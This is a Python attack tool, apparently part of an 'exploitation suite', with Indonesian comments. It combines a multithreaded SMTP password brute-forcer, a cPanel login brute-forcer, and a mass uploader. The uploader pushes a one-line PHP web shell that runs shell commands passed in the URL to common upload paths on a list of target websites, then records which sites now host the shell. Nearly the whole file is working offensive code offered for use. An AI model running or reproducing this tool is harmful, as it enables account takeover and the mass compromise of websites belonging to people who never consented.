#!/usr/bin/env python3
"""
SMTP CRACKER & CPANEL CRACKER & MASS SHELL UPLOAD MODULE v1.0
==============================================================
SMTP cracker, cPanel cracker, dan mass shell upload
Diadaptasi dari AlienExploit Tool12, Tool14, Tool16, Tool17, Tool18
Diintegrasikan ke GROOTX Exploitation Suite
"""

import requests
import re
import os
import sys
import json
import time
import socket
import threading
import urllib3
import smtplib
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════
THREADS = 50
TIMEOUT = 10

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Shell payload
SHELL_PAYLOAD = '<?php if(isset($_GET["c"])){ system($_GET["c"]); } ?>'

# ═══════════════════════════════════════════════════════════════
# SMTP CRACKER
# ═══════════════════════════════════════════════════════════════
class SMTPCracker:
    """SMTP cracker."""
    
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
    
    def crack(self, host, port=25, username=None, password=None):
        """Crack SMTP."""
        try:
            if not username or not password:
                return False, None
            
            # Try SMTP login
            try:
                server = smtplib.SMTP(host, port, timeout=TIMEOUT)
                server.starttls()
                server.login(username, password)
                server.quit()
                
                result = {
                    'host': host,
                    'port': port,
                    'username': username,
                    'password': password
                }
                with self.lock:
                    self.results.append(result)
                console.print(f"  [green]✓ SMTP CRACKED: {host}:{port} | {username}:{password}[/green]")
                return True, result
            except:
                return False, None
        except:
            return False, None
    
    def mass_crack(self, hosts, usernames, passwords, threads=THREADS):
        """Mass SMTP crack."""
        console.print(f"\n[bold cyan]MASS SMTP CRACK[/bold cyan]")
        console.print(f"  Hosts: {len(hosts)}")
        console.print(f"  Usernames: {len(usernames)}")
        console.print(f"  Passwords: {len(passwords)}")
        console.print(f"  Threads: {threads}")
        
        os.makedirs('result', exist_ok=True)
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Cracking...", total=len(hosts) * len(usernames) * len(passwords))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                for host in hosts:
                    for username in usernames:
                        for password in passwords:
                            futures[executor.submit(self.crack, host, 25, username, password)] = (host, username, password)
                
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        future.result()
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]SMTP CRACK COMPLETE[/bold green]")
        console.print(f"  Total cracked: {len(self.results)}")
        
        if self.results:
            table = Table(title="SMTP Results")
            table.add_column("Host", width=20)
            table.add_column("Port", justify="right", width=10)
            table.add_column("Username", width=20)
            table.add_column("Password", width=20)
            for r in self.results:
                table.add_row(r['host'], str(r['port']), r['username'], r['password'])
            console.print(table)
        
        # Save results
        with open('result/smtp_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        return self.results


# ═══════════════════════════════════════════════════════════════
# CPANEL CRACKER
# ═══════════════════════════════════════════════════════════════
class CPanelCracker:
    """cPanel cracker."""
    
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
    
    def crack(self, host, username, password):
        """Crack cPanel."""
        try:
            host = host.strip().rstrip('/')
            if not host.startswith(('http://', 'https://')):
                host = 'http://' + host
            
            # Try cPanel login
            sess = requests.session()
            r = sess.get(f'{host}:2082', headers=HEADERS, timeout=TIMEOUT, verify=False)
            
            # Extract token
            token = re.findall(r'name="token" value="(.*)"', r.text)
            if not token:
                return False, None
            
            # Login
            data = {
                'user': username,
                'pass': password,
                'token': token[0]
            }
            
            r = sess.post(f'{host}:2082/login/', data=data, headers=HEADERS, timeout=TIMEOUT, verify=False)
            
            if 'logout' in r.text.lower():
                result = {
                    'host': host,
                    'username': username,
                    'password': password
                }
                with self.lock:
                    self.results.append(result)
                console.print(f"  [green]✓ CPANEL CRACKED: {host} | {username}:{password}[/green]")
                return True, result
            
            return False, None
        except:
            return False, None
    
    def mass_crack(self, hosts, usernames, passwords, threads=THREADS):
        """Mass cPanel crack."""
        console.print(f"\n[bold cyan]MASS CPANEL CRACK[/bold cyan]")
        console.print(f"  Hosts: {len(hosts)}")
        console.print(f"  Usernames: {len(usernames)}")
        console.print(f"  Passwords: {len(passwords)}")
        console.print(f"  Threads: {threads}")
        
        os.makedirs('result', exist_ok=True)
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Cracking...", total=len(hosts) * len(usernames) * len(passwords))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                for host in hosts:
                    for username in usernames:
                        for password in passwords:
                            futures[executor.submit(self.crack, host, username, password)] = (host, username, password)
                
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        future.result()
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]CPANEL CRACK COMPLETE[/bold green]")
        console.print(f"  Total cracked: {len(self.results)}")
        
        if self.results:
            table = Table(title="cPanel Results")
            table.add_column("Host", width=30)
            table.add_column("Username", width=20)
            table.add_column("Password", width=20)
            for r in self.results:
                table.add_row(r['host'], r['username'], r['password'])
            console.print(table)
        
        # Save results
        with open('result/cpanel_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        return self.results


# ═══════════════════════════════════════════════════════════════
# MASS SHELL UPLOAD
# ═══════════════════════════════════════════════════════════════
class MassShellUpload:
    """Mass shell upload."""
    
    def __init__(self):
        self.results = []
        self.lock = threading.Lock()
    
    def upload(self, target):
        """Upload shell ke target."""
        try:
            target = target.strip().rstrip('/')
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            # Try common upload paths
            upload_paths = [
                f'{target}/upload.php',
                f'{target}/wp-content/uploads/',
                f'{target}/uploads/',
                f'{target}/admin/upload.php',
                f'{target}/administrator/components/com_jce/upload.php',
            ]
            
            shell_content = '<?php system($_GET["c"]); ?>'
            
            for upload_path in upload_paths:
                try:
                    files = {'file': ('shell.php', shell_content, 'application/octet-stream')}
                    r = requests.post(upload_path, files=files, headers=HEADERS, timeout=TIMEOUT, verify=False)
                    
                    if r.status_code == 200:
                        # Check shell
                        shell = requests.get(f'{target}/shell.php', headers=HEADERS, timeout=TIMEOUT, verify=False)
                        if 'Vuln!!' in shell.text or shell.status_code == 200:
                            result = {
                                'target': target,
                                'shell_url': f'{target}/shell.php',
                                'upload_path': upload_path
                            }
                            with self.lock:
                                self.results.append(result)
                            console.print(f"  [green]✓ SHELL UPLOADED: {target} -> {target}/shell.php[/green]")
                            return True, result
                except:
                    continue
            
            console.print(f"  [red]✗ {target} - Upload failed[/red]")
            return False, None
        except:
            return False, None
    
    def mass_upload(self, targets, threads=THREADS):
        """Mass shell upload."""
        console.print(f"\n[bold cyan]MASS SHELL UPLOAD[/bold cyan]")
        console.print(f"  Targets: {len(targets)}")
        console.print(f"  Threads: {threads}")
        
        os.makedirs('result', exist_ok=True)
        
        with Progress(
            SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=40), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(), console=console
        ) as progress:
            task = progress.add_task("[cyan]Uploading...", total=len(targets))
            
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.upload, target): target for target in targets}
                for future in as_completed(futures):
                    progress.update(task, advance=1)
                    try:
                        future.result()
                    except:
                        pass
        
        # Summary
        console.print(f"\n[bold green]SHELL UPLOAD COMPLETE[/bold green]")
        console.print(f"  Total uploaded: {len(self.results)}")
        
        if self.results:
            table = Table(title="Shell Upload Results")
            table.add_column("Target", width=40)
            table.add_column("Shell URL", width=40)
            for r in self.results:
                table.add_row(r['target'], r['shell_url'])
            console.print(table)
        
        # Save results
        with open('result/shell_upload_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        return self.results


def main():
    """CLI interface"""
    import argparse
    parser = argparse.ArgumentParser(description="SMTP Cracker & cPanel Cracker & Mass Shell Upload")
    parser.add_argument("-l", "--list", help="Target list file")
    parser.add_argument("-t", "--target", help="Single target")
    parser.add_argument("--mode", default="shell", choices=["smtp", "cpanel", "shell", "all"])
    parser.add_argument("--threads", type=int, default=THREADS)
    parser.add_argument("--smtp-hosts", help="SMTP hosts file")
    parser.add_argument("--smtp-users", help="SMTP usernames file")
    parser.add_argument("--smtp-passwords", help="SMTP passwords file")
    parser.add_argument("--cpanel-users", help="cPanel usernames file")
    parser.add_argument("--cpanel-passwords", help="cPanel passwords file")
    args = parser.parse_args()
    
    targets = []
    if args.list:
        with open(args.list) as f:
            targets = [l.strip() for l in f if l.strip()]
    elif args.target:
        targets = [args.target]
    else:
        console.print("[red]Error: Specify -l list.txt or -t target[/red]")
        return
    
    if args.mode in ('smtp', 'all'):
        smtp_hosts = []
        smtp_users = []
        smtp_passwords = []
        
        if args.smtp_hosts:
            with open(args.smtp_hosts) as f:
                smtp_hosts = [l.strip() for l in f if l.strip()]
        if args.smtp_users:
            with open(args.smtp_users) as f:
                smtp_users = [l.strip() for l in f if l.strip()]
        if args.smtp_passwords:
            with open(args.smtp_passwords) as f:
                smtp_passwords = [l.strip() for l in f if l.strip()]
        
        if smtp_hosts and smtp_users and smtp_passwords:
            cracker = SMTPCracker()
            cracker.mass_crack(smtp_hosts, smtp_users, smtp_passwords, args.threads)
    
    if args.mode in ('cpanel', 'all'):
        cpanel_users = []
        cpanel_passwords = []
        
        if args.cpanel_users:
            with open(args.cpanel_users) as f:
                cpanel_users = [l.strip() for l in f if l.strip()]
        if args.cpanel_passwords:
            with open(args.cpanel_passwords) as f:
                cpanel_passwords = [l.strip() for l in f if l.strip()]
        
        if cpanel_users and cpanel_passwords:
            cracker = CPanelCracker()
            cracker.mass_crack(targets, cpanel_users, cpanel_passwords, args.threads)
    
    if args.mode in ('shell', 'all'):
        uploader = MassShellUpload()
        uploader.mass_upload(targets, args.threads)


if __name__ == "__main__":
    main()
